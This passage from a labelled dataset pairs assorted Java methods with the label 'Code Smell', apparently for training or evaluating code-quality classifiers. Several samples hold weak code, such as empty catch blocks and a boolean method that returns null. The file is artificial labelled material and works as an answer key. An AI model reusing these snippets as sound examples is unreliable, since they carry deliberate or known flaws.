  if (t != null) {
    logger.error(t.getMessage(),t);
  }
}
",1,Code Smell
"public void setChatInfo(ChatInfo chatInfo){
  this.mChatInfo=chatInfo;
  if (chatInfo != null) {
    DraftInfo draftInfo=chatInfo.getDraft();
    if (draftInfo != null && !TextUtils.isEmpty(draftInfo.getDraftText()) && mTextInput != null) {
      Gson gson=new Gson();
      HashMap draftJsonMap;
      String content=draftInfo.getDraftText();
      try {
        draftJsonMap=gson.fromJson(draftInfo.getDraftText(),HashMap.class);
        if (draftJsonMap != null) {
          content=(String)draftJsonMap.get(""content"");
          String draftStr=(String)draftJsonMap.get(""reply"");
          ReplyPreviewBean bean=gson.fromJson(draftStr,ReplyPreviewBean.class);
          if (bean != null) {
            showReplyPreview(bean);
          }
        }
      }
 catch (      JsonSyntaxException e) {
        TUIChatLog.e(TAG,"" getCustomJsonMap error "");
      }
      mTextInput.setText(content);
      mTextInput.setSelection(mTextInput.getText().length());
    }
  }
}
",1,Code Smell
"@Nullable public static FluidExchange exchange(IFluidHandler fluidTank,IFluidHandlerItem fluidItem,FluidExchange preferred,int maxAmount){
  return exchange(fluidTank,fluidItem,preferred,true,maxAmount);
}
@Nullable private static FluidExchange exchange(IFluidHandler fluidTank,IFluidHandlerItem fluidItem,FluidExchange preferred,boolean singleOp,int maxTransferAmountPerTank){
  FluidExchange lockedExchange=null;
  for (int tankSlot=0; tankSlot < fluidTank.getTanks(); tankSlot++) {
    for (int slot=0; slot < fluidItem.getTanks(); slot++) {
      FluidStack fluidInTank=fluidTank.getFluidInTank(tankSlot);
      int tankCapacity=fluidTank.getTankCapacity(tankSlot) - fluidInTank.getAmount();
      boolean tankEmpty=fluidInTank.isEmpty();
      FluidStack fluidInItem=fluidItem.getFluidInTank(tankSlot);
      int itemCapacity=fluidItem.getTankCapacity(tankSlot) - fluidInItem.getAmount();
      boolean itemEmpty=fluidInItem.isEmpty();
      boolean undecided=lockedExchange == null;
      boolean canMoveToTank=(undecided || lockedExchange == FluidExchange.ITEM_TO_TANK) && tankCapacity > 0;
      boolean canMoveToItem=(undecided || lockedExchange == FluidExchange.TANK_TO_ITEM) && itemCapacity > 0;
      if (!tankEmpty && !itemEmpty && !fluidInItem.isFluidEqual(fluidInTank))       continue;
      if (((tankEmpty || itemCapacity <= 0) && canMoveToTank) || undecided && preferred == FluidExchange.ITEM_TO_TANK) {
        int amount=fluidTank.fill(fluidItem.drain(Math.min(maxTransferAmountPerTank,tankCapacity),FluidAction.EXECUTE),FluidAction.EXECUTE);
        if (amount > 0) {
          lockedExchange=FluidExchange.ITEM_TO_TANK;
          if (singleOp)           return lockedExchange;
          continue;
        }
      }
      if (((itemEmpty || tankCapacity <= 0) && canMoveToItem) || undecided && preferred == FluidExchange.TANK_TO_ITEM) {
        int amount=fluidItem.fill(fluidTank.drain(Math.min(maxTransferAmountPerTank,itemCapacity),FluidAction.EXECUTE),FluidAction.EXECUTE);
        if (amount > 0) {
          lockedExchange=FluidExchange.TANK_TO_ITEM;
          if (singleOp)           return lockedExchange;
          continue;
        }
      }
    }
  }
  return null;
}",1,Code Smell
"/** 
 * Verify if payload contains invalid or unaccepted origin country.
 * @return false if the originCountry field of the given payload does not contain a country code from the configured<code>application.yml/supported-countries</code>
 */
private boolean checkOriginCountryIsValid(SubmissionPayload submissionPayload,ConstraintValidatorContext validatorContext){
  String originCountry=submissionPayload.getOrigin();
  if (submissionPayload.hasOrigin() && !ObjectUtils.isEmpty(originCountry) && !originCountry.equals(defaultOriginCountry)) {
    addViolation(validatorContext,String.format(""Origin country %s is not part of the supported countries list"",originCountry));
    return false;
  }
  return true;
}
",1,Code Smell
"public static void examine(Config config,Project project){
  ApplicationManager.getApplication().executeOnPooledThread(new Runnable(){
    @Override public void run(){
      if (config != null && config.getUpdate() && isCheck) {
        UpdateUtils.isCheck=false;
        CloseableHttpClient httpClient=HttpClients.custom().build();
        HttpGet httpget=null;
        try {
          String[] version=PluginManagerCore.getPlugin(PluginId.getId(PluginConstant.PLUGIN_ID)).getVersion().replace(""v"","""").split(""\\.|-"");
          httpget=new HttpGet(""https://plugins.jetbrains.com/api/plugins/"" + PluginConstant.WEB_ID + ""/updates"");
          CloseableHttpResponse response=httpClient.execute(httpget);
          String body=EntityUtils.toString(response.getEntity(),""UTF-8"");
          JSONArray jsonArray=JSONObject.parseArray(body);
          for (int i=0; i < jsonArray.size(); i++) {
            JSONObject jsonObject=jsonArray.getJSONObject(i);
            if (jsonObject.getBoolean(""approve"")) {
              String[] nweVersion=jsonObject.getString(""version"").replace(""v"","""").split(""\\.|-"");
              if (Integer.valueOf(version[0]) < Integer.valueOf(nweVersion[0])) {
                MessageUtils.getInstance(project).showInfoMsg(""info"",PropertiesUtils.getInfo(""updata"",jsonObject.getString(""version"")));
                break;
              }
 else               if (Integer.valueOf(version[0]).equals(Integer.valueOf(nweVersion[0]))) {
                if (Integer.valueOf(version[1]) < Integer.valueOf(nweVersion[1])) {
                  MessageUtils.getInstance(project).showInfoMsg(""info"",PropertiesUtils.getInfo(""updata"",jsonObject.getString(""version"")));
                  break;
                }
              }
            }
          }
        }
 catch (        Exception e) {
        }
 finally {
          if (httpget != null) {
            httpget.abort();
          }
          try {
            httpClient.close();
          }
 catch (          IOException e) {
          }
        }
      }
    }
  }
);
}",1,Code Smell
"private boolean checkEndGame(Player p,int row,int col){
  String winString="""";
  for (int i=0; i < boardSize; i++) {
    winString+=String.valueOf(p.getPlayerSymbol());
  }
  String rowString="""";
  String colString="""";
  String diagonalString="""";
  String reverseDiagonalString="""";
  for (int i=0; i < board.length; i=i + 2) {
    rowString+=board[row][i];
    colString+=board[i][col];
    if (row == col) {
      diagonalString+=board[i][i];
    }
    if ((row + col) == board.length - 1) {
      reverseDiagonalString+=board[board.length - 1 - i][i];
    }
  }
  if (winString.equals(rowString) || winString.equals(colString) || winString.equals(diagonalString)|| winString.equals(reverseDiagonalString)) {
    System.out.println(p.getPlayerName() + "" has won the Game"");
    return true;
  }
  return false;
}",1,Code Smell
"@Override public View createView(Context context){
  actionBar.setBackButtonImage(R.drawable.ic_ab_back);
  actionBar.setAllowOverlayTitle(true);
  actionBar.setTitle(LocaleController.getString(""Filters"",R.string.Filters));
  actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
    @Override public void onItemClick(    int id){
      if (id == -1) {
        finishFragment();
      }
    }
  }
);
  fragmentView=new FrameLayout(context);
  FrameLayout frameLayout=(FrameLayout)fragmentView;
  frameLayout.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundGray));
  LinearLayoutManager layoutManager;
  listView=new RecyclerListView(context){
    @Override public boolean onTouchEvent(    MotionEvent e){
      if (e.getAction() == MotionEvent.ACTION_UP || e.getAction() == MotionEvent.ACTION_CANCEL) {
        AndroidUtilities.runOnUIThread(() -> {
          getMessagesController().lockFiltersInternal();
        }
,250);
      }
      return super.onTouchEvent(e);
    }
    @Override protected void dispatchDraw(    Canvas canvas){
      drawSectionBackground(canvas,filtersStartRow,filtersEndRow,getThemedColor(Theme.key_windowBackgroundWhite));
      super.dispatchDraw(canvas);
    }
  }
;
  DefaultItemAnimator itemAnimator=new DefaultItemAnimator();
  itemAnimator.setDurations(350);
  itemAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  itemAnimator.setDelayAnimations(false);
  itemAnimator.setSupportsChangeAnimations(false);
  listView.setItemAnimator(itemAnimator);
  ((DefaultItemAnimator)listView.getItemAnimator()).setDelayAnimations(false);
  listView.setLayoutManager(layoutManager=new LinearLayoutManager(context,LinearLayoutManager.VERTICAL,false));
  listView.setVerticalScrollBarEnabled(false);
  itemTouchHelper=new ItemTouchHelper(new TouchHelperCallback());
  itemTouchHelper.attachToRecyclerView(listView);
  frameLayout.addView(listView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT));
  listView.setAdapter(adapter=new ListAdapter(context));
  listView.setOnItemClickListener((view,position,x,y) -> {
    if (position >= filtersStartRow && position < filtersEndRow) {
      int filterPosition=position - filtersStartRow;
      if (!showAllChats) {
        filterPosition++;
      }
      if (getMessagesController().dialogFilters.get(filterPosition).isDefault()) {
        return;
      }
      MessagesController.DialogFilter filter=getMessagesController().dialogFilters.get(filterPosition);
      if (filter.locked) {
        showDialog(new LimitReachedBottomSheet(this,context,LimitReachedBottomSheet.TYPE_FOLDERS,currentAccount));
      }
 else {
        presentFragment(new FilterCreateActivity(getMessagesController().dialogFilters.get(filterPosition)));
      }
    }
 else     if (position == createFilterRow) {
      if ((getMessagesController().dialogFilters.size() - 1 >= getMessagesController().dialogFiltersLimitDefault && !getUserConfig().isPremium()) || getMessagesController().dialogFilters.size() >= getMessagesController().dialogFiltersLimitPremium) {
        showDialog(new LimitReachedBottomSheet(this,context,LimitReachedBottomSheet.TYPE_FOLDERS,currentAccount));
      }
 else {
        presentFragment(new FilterCreateActivity());
      }
    }
  }
);
  return fragmentView;
}",1,Code Smell
"@Override public void onAuthenticationSuccess(HttpServletRequest request,HttpServletResponse response,Authentication authentication) throws ServletException, IOException {
  HttpSession session=request.getSession(false);
  SavedRequest savedRequest=(session != null) ? (SavedRequest)session.getAttribute(""SPRING_SECURITY_SAVED_REQUEST"") : null;
  if (savedRequest != null && !RequestUriUtils.isStaticResource(savedRequest.getRedirectUrl())) {
    super.onAuthenticationSuccess(request,response,authentication);
  }
 else {
    OAuth2User oauthUser=(OAuth2User)authentication.getPrincipal();
    OAUTH2 oAuth=applicationProperties.getSecurity().getOAUTH2();
    String username=oauthUser.getName();
    if (loginAttemptService.isBlocked(username)) {
      if (session != null) {
        session.removeAttribute(""SPRING_SECURITY_SAVED_REQUEST"");
      }
      throw new LockedException(""Your account has been locked due to too many failed login attempts."");
    }
    if (userService.usernameExistsIgnoreCase(username) && userService.hasPassword(username) && !userService.isAuthenticationTypeByUsername(username,AuthenticationType.OAUTH2)&& oAuth.getAutoCreateUser()) {
      response.sendRedirect(request.getContextPath() + ""/logout?oauth2AuthenticationErrorWeb=true"");
      return;
    }
 else {
      try {
        userService.processOAuth2PostLogin(username,oAuth.getAutoCreateUser());
        response.sendRedirect(""/"");
        return;
      }
 catch (      IllegalArgumentException e) {
        response.sendRedirect(""/logout?invalidUsername=true"");
        return;
      }
    }
  }
}",1,Code Smell
"public static boolean canPistonMoveBlock(BlockState state,boolean isPushing){
  Block block=state.block();
  if (block == Blocks.AIR) {
    return true;
  }
  if (block == Blocks.OBSIDIAN || block == Blocks.CRYING_OBSIDIAN || block == Blocks.RESPAWN_ANCHOR || block == Blocks.REINFORCED_DEEPSLATE) {
    return false;
  }
  if (block instanceof PistonBlock) {
    return !state.getValue(Properties.EXTENDED);
  }
  if (block.destroyTime() == -1.0f) {
    return false;
  }
  return null;
}",1,Code Smell
"@NonNull @Override protected InteractiveTag testMobInteraction(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  if (!canEat(itemInHand) && getFlag(EntityFlag.SADDLED) && passengers.isEmpty()&& !session.isSneaking()) {
    return InteractiveTag.MOUNT;
  }
 else {
    InteractiveTag superTag=super.testMobInteraction(hand,itemInHand);
    if (superTag != InteractiveTag.NONE) {
      return superTag;
    }
 else {
      return EntityUtils.attemptToSaddle(this,itemInHand).consumesAction() ? InteractiveTag.SADDLE : InteractiveTag.NONE;
    }
  }
}
",1,Code Smell
"@Idempotent(uniqueKeyPrefix=""index12306-ticket:binlog_sync:"",key=""#message.getId()+'_'+#message.hashCode()"",type=IdempotentTypeEnum.SPEL,scene=IdempotentSceneEnum.MQ,keyTimeout=7200L) @Override public void onMessage(CanalBinlogEvent message){
  if (message.getIsDdl() || CollUtil.isEmpty(message.getOld()) || !Objects.equals(""UPDATE"",message.getType())|| !StrUtil.equals(ticketAvailabilityCacheUpdateType,""binlog"")) {
    return;
  }
  abstractStrategyChoose.chooseAndExecute(message.getTable(),message,CanalExecuteStrategyMarkEnum.isPatternMatch(message.getTable()));
}",1,Code Smell
"@InvokeHandler(signature=""<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"",argIndexes={BASE,0}) public void methodInvoke(Context context,Invoke invoke,PointsToSet mtdObjs,PointsToSet recvObjs){
  if (isIgnored(invoke)) {
    return;
  }
  if (typeMatcher.hasTypeInfo(invoke)) {
    Var m=InvokeUtils.getVar(invoke,BASE);
    mtdObjs.forEach(obj -> {
      if (helper.isUnknownMetaObj(obj)) {
        MethodInfo methodInfo=helper.getMethodInfo(obj);
        JClass clazz=methodInfo.clazz();
        if (clazz != null && (!ONLY_APP || clazz.isApplication())) {
          Stream<JMethod> targets=methodInfo.isFromGetMethod() ? Reflections.getMethods(clazz) : Reflections.getDeclaredMethods(clazz);
          targets.filter(target -> !typeMatcher.isUnmatched(invoke,target)).map(helper::getMetaObj).forEach(mtdObj -> solver.addVarPointsTo(context,m,mtdObj));
        }
      }
    }
);
  }
  if (!unsoundInvokes.contains(invoke)) {
    Var o=InvokeUtils.getVar(invoke,0);
    boolean oIsNull=o.isConst() && o.getConstValue() instanceof NullLiteral;
    for (    CSObj mtdObj : mtdObjs) {
      if (helper.isUnknownMetaObj(mtdObj)) {
        MethodInfo methodInfo=helper.getMethodInfo(mtdObj);
        if (methodInfo.isClassUnknown()) {
          if (oIsNull) {
            unsoundInvokes.add(invoke);
            return;
          }
          for (          CSObj recvObj : recvObjs) {
            if (recvObj.getObject() instanceof MockObj && mockObj.getDescriptor().equals(UNKNOWN_DESC)) {
              unsoundInvokes.add(invoke);
              return;
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override public boolean needCloseLastFragment(INavigationLayout layout){
  if (AndroidUtilities.isTablet()) {
    if (layout == actionBarLayout && layout.getFragmentStack().size() <= 1) {
      onFinish();
      finish();
      return false;
    }
 else     if (layout == rightActionBarLayout) {
      if (!tabletFullSize) {
        backgroundTablet.setVisibility(View.VISIBLE);
      }
    }
 else     if (layout == layersActionBarLayout && actionBarLayout.getFragmentStack().isEmpty() && layersActionBarLayout.getFragmentStack().size() == 1) {
      onFinish();
      finish();
      return false;
    }
  }
 else {
    if (layout.getFragmentStack().size() <= 1) {
      onFinish();
      finish();
      return false;
    }
    if (layout.getFragmentStack().size() >= 2 && !(layout.getFragmentStack().get(0) instanceof LoginActivity)) {
      drawerLayoutContainer.setAllowOpenDrawer(true,false);
    }
  }
  return true;
}",1,Code Smell
"private static FieldSerializer getFieldSerializer(Field field){
  Class<?> type=field.getType();
  if (boolean.class.equals(type)) {
    return new BooleanFieldSerializer(field);
  }
 else   if (byte.class.equals(type)) {
    return new ByteFieldSerializer(field);
  }
 else   if (char.class.equals(type)) {
    return new CharFieldSerializer(field);
  }
 else   if (short.class.equals(type)) {
    return new ShortFieldSerializer(field);
  }
 else   if (int.class.equals(type)) {
    return new IntFieldSerializer(field);
  }
 else   if (long.class.equals(type)) {
    return new LongFieldSerializer(field);
  }
 else   if (double.class.equals(type)) {
    return new DoubleFieldSerializer(field);
  }
 else   if (float.class.equals(type)) {
    return new FloatFieldSerializer(field);
  }
 else   if (String.class.equals(type)) {
    return new StringFieldSerializer(field);
  }
 else   if (java.util.Date.class.equals(type) || java.sql.Date.class.equals(type) || java.sql.Timestamp.class.equals(type)|| java.sql.Time.class.equals(type)) {
    return new DateFieldSerializer(field);
  }
 else   return new ObjectFieldSerializer(field);
}
",1,Code Smell
"public Page<ConfigInfo> findConfigInfoByDataIdAndAdvance(final int pageNo,final int pageSize,final String dataId,final String tenant,final Map<String,Object> configAdvanceInfo){
  String tenantTmp=StringUtils.isBlank(tenant) ? StringUtils.EMPTY : tenant;
  PaginationHelper<ConfigInfo> helper=new PaginationHelper<ConfigInfo>();
  final String appName=configAdvanceInfo == null ? null : (String)configAdvanceInfo.get(""appName"");
  final String configTags=configAdvanceInfo == null ? null : (String)configAdvanceInfo.get(""config_tags"");
  StringBuilder sqlCount=new StringBuilder(""select count(*) from config_info where data_id=? and tenant_id=? "");
  StringBuilder sql=new StringBuilder(""select ID,data_id,group_id,tenant_id,app_name,content from config_info where data_id=? and tenant_id=? "");
  List<String> paramList=new ArrayList<String>();
  paramList.add(dataId);
  paramList.add(tenantTmp);
  if (StringUtils.isNotBlank(configTags)) {
    sqlCount=new StringBuilder(""select count(*) from config_info  a left join config_tags_relation b on a.id=b.id where a.data_id=? "" + ""and a.tenant_id=? "");
    sql=new StringBuilder(""select a.ID,a.data_id,a.group_id,a.tenant_id,a.app_name,a.content from config_info  a left join "" + ""config_tags_relation b on a.id=b.id where a.data_id=? and a.tenant_id=? "");
    sqlCount.append("" and b.tag_name in ("");
    sql.append("" and b.tag_name in ("");
    String[] tagArr=configTags.split("","");
    for (int i=0; i < tagArr.length; i++) {
      if (i != 0) {
        sqlCount.append("", "");
        sql.append("", "");
      }
      sqlCount.append(""?"");
      sql.append(""?"");
      paramList.add(tagArr[i]);
    }
    sqlCount.append("") "");
    sql.append("") "");
    if (StringUtils.isNotBlank(appName)) {
      sqlCount.append("" and a.app_name=? "");
      sql.append("" and a.app_name=? "");
      paramList.add(appName);
    }
  }
 else {
    if (StringUtils.isNotBlank(appName)) {
      sqlCount.append("" and app_name=? "");
      sql.append("" and app_name=? "");
      paramList.add(appName);
    }
  }
  try {
    return helper.fetchPage(this.jt,sqlCount.toString(),sql.toString(),paramList.toArray(),pageNo,pageSize,CONFIG_INFO_ROW_MAPPER);
  }
 catch (  CannotGetJdbcConnectionException e) {
    fatalLog.error(""[db-error] "" + e.toString(),e);
    throw e;
  }
}",1,Code Smell
"void addPreDrawListener(){
  if (mPreDrawListener != null) {
    return;
  }
  mPreDrawListener=new ViewTreeObserver.OnPreDrawListener(){
    @Override public boolean onPreDraw(){
      if (mSubtitle.getVisibility() == View.VISIBLE && mSubtitle.getTop() > view.getHeight() && mTitle.getLineCount() > 1) {
        mTitle.setMaxLines(mTitle.getLineCount() - 1);
        return false;
      }
      final int titleLines=mTitle.getLineCount();
      final int maxLines=titleLines > 1 ? mBodyMinLines : mBodyMaxLines;
      if (mBody.getMaxLines() != maxLines) {
        mBody.setMaxLines(maxLines);
        return false;
      }
 else {
        removePreDrawListener();
        return true;
      }
    }
  }
;
  view.getViewTreeObserver().addOnPreDrawListener(mPreDrawListener);
}",1,Code Smell
"private void exportResult(final ActivityResult result){
  if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
    Context context=requireContext();
    String data=mList.toJson(true);
    try (OutputStream out=context.getContentResolver().openOutputStream(result.getData().getData(),""rwt"")){
      try (PrintWriter printer=new PrintWriter(out)){
        printer.print(data);
        Utils.showToast(context,R.string.save_ok);
      }
     }
 catch (    IOException e) {
      e.printStackTrace();
      Utils.showToastLong(context,R.string.export_failed);
    }
  }
}
",1,Code Smell
"public static void clientTick(){
  Minecraft mc=Minecraft.getInstance();
  LocalPlayer player=mc.player;
  Vec3 lookAngle=player.getLookAngle();
  BlockPos hovered=null;
  boolean direction=false;
  EdgePointType<?> type=null;
  BezierTrackPointLocation hoveredBezier=null;
  ItemStack stack=player.getMainHandItem();
  if (stack.getItem() instanceof TrackTargetingBlockItem)   type=ttbi.getType(stack);
  if (type == EdgePointType.SIGNAL)   Create.RAILWAYS.sided(null).tickSignalOverlay();
  boolean alreadySelected=stack.hasTag() && stack.getTag().contains(""SelectedPos"");
  if (type != null) {
    BezierPointSelection bezierSelection=TrackBlockOutline.result;
    if (alreadySelected) {
      CompoundTag tag=stack.getTag();
      hovered=NbtUtils.readBlockPos(tag.getCompound(""SelectedPos""));
      direction=tag.getBoolean(""SelectedDirection"");
      if (tag.contains(""Bezier"")) {
        CompoundTag bezierNbt=tag.getCompound(""Bezier"");
        BlockPos key=NbtUtils.readBlockPos(bezierNbt.getCompound(""Key""));
        hoveredBezier=new BezierTrackPointLocation(key,bezierNbt.getInt(""Segment""));
      }
    }
 else     if (bezierSelection != null) {
      hovered=bezierSelection.blockEntity().getBlockPos();
      hoveredBezier=bezierSelection.loc();
      direction=lookAngle.dot(bezierSelection.direction()) < 0;
    }
 else {
      HitResult hitResult=mc.hitResult;
      if (hitResult != null && hitResult.getType() == Type.BLOCK) {
        BlockHitResult blockHitResult=(BlockHitResult)hitResult;
        BlockPos pos=blockHitResult.getBlockPos();
        BlockState blockState=mc.level.getBlockState(pos);
        if (blockState.getBlock() instanceof ITrackBlock) {
          direction=track.getNearestTrackAxis(mc.level,pos,blockState,lookAngle).getSecond() == AxisDirection.POSITIVE;
          hovered=pos;
        }
      }
    }
  }
  if (hovered == null) {
    lastHovered=null;
    lastResult=null;
    lastLocation=null;
    lastHoveredBezierSegment=null;
    return;
  }
  if (Objects.equal(hovered,lastHovered) && Objects.equal(hoveredBezier,lastHoveredBezierSegment) && direction == lastDirection && type == lastType)   return;
  lastType=type;
  lastHovered=hovered;
  lastDirection=direction;
  lastHoveredBezierSegment=hoveredBezier;
  TrackTargetingBlockItem.withGraphLocation(mc.level,hovered,direction,hoveredBezier,type,(result,location) -> {
    lastResult=result;
    lastLocation=location;
  }
);
}",1,Code Smell
"public static void Path(String pathString){
  String scheme=null;
  String authority=null;
  int start=0;
  final int colon=pathString.indexOf(':');
  final int slash=pathString.indexOf('/');
  if ((colon != -1) && ((slash == -1) || (colon < slash))) {
    scheme=pathString.substring(0,colon);
    start=colon + 1;
  }
  if (pathString.startsWith(""//"",start) && (pathString.length() - start > 2)) {
    final int nextSlash=pathString.indexOf('/',start + 2);
    final int authEnd=nextSlash > 0 ? nextSlash : pathString.length();
    authority=pathString.substring(start + 2,authEnd);
    start=authEnd;
  }
  final String path=pathString.substring(start,pathString.length());
  System.out.println(path);
}",1,Code Smell
"/** 
 * 鏌ヨ娑堟伅鍒楄〃
 * @param adminMessageBO 鎼滅储瀵硅薄
 * @return data
 */
@Override public BasePage<AdminMessage> queryList(AdminMessageQueryBO adminMessageBO){
  adminMessageBO.setUserId(UserUtil.getUserId());
  BasePage<AdminMessage> adminMessageBasePage=getBaseMapper().queryList(adminMessageBO.parse(),adminMessageBO);
  if (Arrays.asList(14,16,18,20).contains(adminMessageBO.getType())) {
    adminMessageBasePage.getList().forEach(data -> {
      List<String> splitTrim=StrUtil.splitTrim(data.getContent(),Const.SEPARATOR);
      data.setContent(splitTrim.size() > 0 ? splitTrim.get(0) : ""0"");
      if (StrUtil.isEmpty(data.getTitle())) {
        data.setTitle(""0"");
      }
    }
);
  }
  return adminMessageBasePage;
}",1,Code Smell
"private void checkMore(int count){
  if (mScroller.isDisable() || count == 0 || mBinding.recycler.canScrollVertically(1) || mBinding.recycler.getScrollState() > 0 || isHome())   return;
  getVideo(getTypeId(),String.valueOf(mScroller.addPage()));
}",1,Code Smell
"/** 
 * Checks that the first of two subsequent output jars has a filter.
 */
private void checkOutputJarFilter(ClassPath programJars) throws IOException {
  for (int index=0; index < programJars.size() - 1; index++) {
    ClassPathEntry entry=programJars.get(index);
    if (entry.isOutput() && !entry.isFiltered() && programJars.get(index + 1).isOutput()) {
      throw new IOException(""The output jar ["" + entry.getName() + ""] must have a filter, or all subsequent output jars will be empty."");
    }
  }
}",1,Code Smell
"private BGMInfo createBGMInfoFromJsonFile(){
  LiteavLog.i(TAG,""bgm json file path ="" + mBGMJsonFilePath);
  if (mBGMJsonFilePath == null || mBGMJsonFilePath.isEmpty() || !mBGMJsonFilePath.endsWith("".json"")) {
    LiteavLog.e(TAG,""pasterJsonFilePath ="" + mBGMJsonFilePath + "" is invalid paster json file"");
    return null;
  }
  String json=TUIMultimediaFileUtil.readTextFromFile(mBGMJsonFilePath);
  Gson gson=new Gson();
  return gson.fromJson(json,BGMInfo.class);
}
",1,Code Smell
"/** 
 * callback
 * @param data
 * @return
 */
@RequestMapping(""/processCallback"") public ReturnT<String> processCallback(HttpServletRequest request,@RequestBody(required=false) String data){
  if (JobAdminConfig.getAdminConfig().getAccessToken() != null && JobAdminConfig.getAdminConfig().getAccessToken().trim().length() > 0 && !JobAdminConfig.getAdminConfig().getAccessToken().equals(request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
    return new ReturnT<>(ReturnT.FAIL_CODE,""The access token is wrong."");
  }
  List<HandleProcessCallbackParam> callbackParamList=null;
  try {
    callbackParamList=JacksonUtil.readValue(data,List.class,HandleProcessCallbackParam.class);
  }
 catch (  Exception e) {
  }
  if (callbackParamList == null || callbackParamList.size() == 0) {
    return new ReturnT<>(ReturnT.FAIL_CODE,""The request data invalid."");
  }
  return adminBiz.processCallback(callbackParamList);
}",1,Code Smell
"public void loadSavedReactions(boolean force){
  if (loadingSavedReactions || loadedSavedReactions && !force) {
    return;
  }
  SharedPreferences savedReactionsPref=ApplicationLoader.applicationContext.getSharedPreferences(""saved_reactions_"" + currentAccount,Context.MODE_PRIVATE);
  savedReactions.clear();
  savedReactions.addAll(loadReactionsFromPref(savedReactionsPref));
  loadingSavedReactions=true;
  loadedSavedReactions=true;
  boolean loadFromServer=true;
  if (loadFromServer) {
    TLRPC.TL_messages_getDefaultTagReactions recentReactionsRequest=new TLRPC.TL_messages_getDefaultTagReactions();
    recentReactionsRequest.hash=savedReactionsPref.getLong(""hash"",0);
    ConnectionsManager.getInstance(currentAccount).sendRequest(recentReactionsRequest,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      if (error == null) {
        if (response instanceof TLRPC.TL_messages_reactions) {
          TLRPC.TL_messages_reactions reactions=(TLRPC.TL_messages_reactions)response;
          savedReactions.clear();
          savedReactions.addAll(reactions.reactions);
          saveReactionsToPref(savedReactionsPref,reactions.hash,reactions.reactions);
          getNotificationCenter().postNotificationName(NotificationCenter.savedReactionTagsUpdate,0L);
        }
        if (response instanceof TLRPC.TL_messages_reactionsNotModified) {
        }
      }
      loadingSavedReactions=false;
    }
));
  }
}",1,Code Smell
"private String nextFocusUserId(AVEngineKit.CallSession session){
  if (!TextUtils.isEmpty(focusTargetId) && (session.getParticipantIds().contains(focusTargetId))) {
    PeerConnectionClient client=session.getClient(focusTargetId);
    if (client != null && client.state == AVEngineKit.CallState.Connected && !client.videoMuted && !client.audience) {
      return focusTargetId;
    }
  }
  if (ChatManager.Instance().getUserId().equals(focusTargetId)) {
    if (session.state == AVEngineKit.CallState.Connected && !session.videoMuted) {
      return focusTargetId;
    }
  }
  String targetId=null;
  if (session.isConference()) {
    List<String> participants=session.getParticipantIds();
    if (!participants.isEmpty()) {
      for (      String participant : participants) {
        PeerConnectionClient client=session.getClient(participant);
        if (client.state == AVEngineKit.CallState.Connected && !client.audience && !client.videoMuted) {
          targetId=participant;
          break;
        }
      }
    }
  }
 else {
    if (session.getConversation().type == Conversation.ConversationType.Group) {
      for (      AVEngineKit.ParticipantProfile profile : session.getParticipantProfiles()) {
        if (profile.getState() == AVEngineKit.CallState.Connected && !profile.isVideoMuted()) {
          targetId=profile.getUserId();
          break;
        }
      }
    }
 else {
      targetId=session.getConversation().target;
    }
  }
  if (targetId == null && session.state == AVEngineKit.CallState.Connected && !session.videoMuted) {
    targetId=ChatManager.Instance().getUserId();
  }
  return targetId;
}
",1,Code Smell
"@Override protected void deltaPositions(@NonNull TrackingState oldState,@NonNull TrackingState newState,@NonNull Consumer<HeightmapPos> added,@NonNull Consumer<HeightmapPos> removed){
  final int oldPlayerX=floorI(oldState.x());
  final int oldPlayerZ=floorI(oldState.z());
  final int newPlayerX=floorI(newState.x());
  final int newPlayerZ=floorI(newState.z());
  for (int lvl=min(oldState.minLevel(),newState.minLevel()); lvl < max(oldState.maxLevel(),newState.maxLevel()); lvl++) {
    final int oldBaseX=asrRound(oldPlayerX,T_SHIFT + lvl);
    final int oldBaseZ=asrRound(oldPlayerZ,T_SHIFT + lvl);
    final int newBaseX=asrRound(newPlayerX,T_SHIFT + lvl);
    final int newBaseZ=asrRound(newPlayerZ,T_SHIFT + lvl);
    if (oldState.hasLevel(lvl) && newState.hasLevel(lvl) && oldState.cutoff() == newState.cutoff() && oldBaseX == newBaseX && oldBaseZ == newBaseZ) {
      continue;
    }
    IntAxisAlignedBB limits=this.coordLimits[lvl];
    if (!newState.hasLevel(lvl) || oldState.hasLevel(lvl)) {
      int minX=max(oldBaseX - oldState.cutoff(),limits.minX());
      int minZ=max(oldBaseZ - oldState.cutoff(),limits.minZ());
      int maxX=min(oldBaseX + oldState.cutoff(),limits.maxX());
      int maxZ=min(oldBaseZ + oldState.cutoff(),limits.maxZ());
      for (int x=minX; x <= maxX; x++) {
        for (int z=minZ; z <= maxZ; z++) {
          if (!newState.hasLevel(lvl) || !overlaps(x,z,newBaseX,newBaseZ,newState.cutoff())) {
            removed.accept(new HeightmapPos(lvl,x,z));
          }
        }
      }
    }
    if (!oldState.hasLevel(lvl) || newState.hasLevel(lvl)) {
      int minX=max(newBaseX - newState.cutoff(),limits.minX());
      int minZ=max(newBaseZ - newState.cutoff(),limits.minZ());
      int maxX=min(newBaseX + newState.cutoff(),limits.maxX());
      int maxZ=min(newBaseZ + newState.cutoff(),limits.maxZ());
      for (int x=minX; x <= maxX; x++) {
        for (int z=minZ; z <= maxZ; z++) {
          if (!oldState.hasLevel(lvl) || !overlaps(x,z,oldBaseX,oldBaseZ,oldState.cutoff())) {
            added.accept(new HeightmapPos(lvl,x,z));
          }
        }
      }
    }
  }
}
",1,Code Smell
"public void setData(PremiumPreviewFragment.PremiumFeatureData data,boolean drawDivider){
  if (UserConfig.getInstance(UserConfig.selectedAccount).isPremium() && data.type == PremiumPreviewFragment.PREMIUM_FEATURE_EMOJI_STATUS && data.icon == R.drawable.filled_premium_status2) {
    nextIcon.setVisibility(View.GONE);
    if (imageDrawable == null) {
      imageDrawable=new AnimatedEmojiDrawable.SwapAnimatedEmojiDrawable(this,false,dp(24),AnimatedEmojiDrawable.CACHE_TYPE_ALERT_PREVIEW_STATIC);
      if (isAttachedToWindow()) {
